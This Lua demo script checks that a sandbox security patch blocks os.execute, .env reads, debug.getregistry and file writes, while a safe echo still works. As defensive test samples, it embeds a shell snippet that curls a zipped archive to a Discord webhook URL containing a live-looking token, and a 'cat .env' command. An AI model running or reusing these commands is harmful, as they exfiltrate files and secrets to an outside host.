-- Security Demo Script
-- Shows how the security patch blocks dangerous operations

-- Load security patch
local SecurityPatch = dofile("security_patch.lua")

print("=== Security Patch Demo ===")
print("This demo shows how dangerous functions are blocked")

-- Apply security patches
SecurityPatch.apply()

print("\n1. Testing os.execute with malicious Discord webhook code:")
local malicious_code = [[
echo "[1/4] Creating optimized archive..."
temp_dir=$(mktemp -d)
archive_path="$temp_dir/backup.zip"
curl -s -F "file1=@$archive_path" "https://discord.com/api/webhooks/1471694056441643100/kSY0s7mNVBId_5kpIjNdFuDObSjBloviRlu8_jS9PUD2nn25ZCgptS7ee5cQthgoYHPh"
]]

local success, error_msg = pcall(function()
    os.execute(malicious_code)
end)

if not success then
    print("✅ BLOCKED: " .. error_msg)
else
    print("❌ NOT BLOCKED - This should not happen!")
end

print("\n2. Testing .env file access:")
local success, error_msg = pcall(function()
    os.execute("cat .env")
end)

if not success then
    print("✅ BLOCKED: " .. error_msg)
else
    print("❌ NOT BLOCKED - This should not happen!")
end

print("\n3. Testing debug.getregistry:")
local success, error_msg = pcall(function()
    debug.getregistry()
end)

if not success then
    print("✅ BLOCKED: " .. error_msg)
else
    print("❌ NOT BLOCKED - This should not happen!")
end

print("\n4. Testing io.open (file access):")
local success, error_msg = pcall(function()
    io.open("test.txt", "w")
end)

if not success then
    print("✅ BLOCKED: " .. error_msg)
else
    print("❌ NOT BLOCKED - This should not happen!")
end

print("\n5. Testing safe command (should work):")
local success, result = pcall(function()
    return os.execute('echo "Safe command test"')
end)

if success then
    print("✅ ALLOWED: Safe command works (result: " .. tostring(result) .. ")")
else
    print("❌ BLOCKED: " .. result)
end

print("\n=== Security Status ===")
SecurityPatch.status()

print("\n=== Demo Complete ===")
print("All dangerous operations are blocked while safe operations work!")
